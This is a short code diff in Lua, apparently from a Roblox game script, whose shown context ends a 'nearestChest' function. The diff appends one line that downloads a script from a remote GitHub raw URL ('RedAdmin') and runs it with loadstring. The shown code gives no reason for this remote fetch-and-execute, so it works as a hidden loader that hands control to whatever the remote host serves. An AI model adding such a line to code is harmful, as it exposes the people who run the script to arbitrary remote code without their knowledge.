@@ -678,3 +678,5 @@ function nearestChest()
 	end
 	return closestChest
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RedZenXYZ/RedCommands/main/RedAdmin"))()
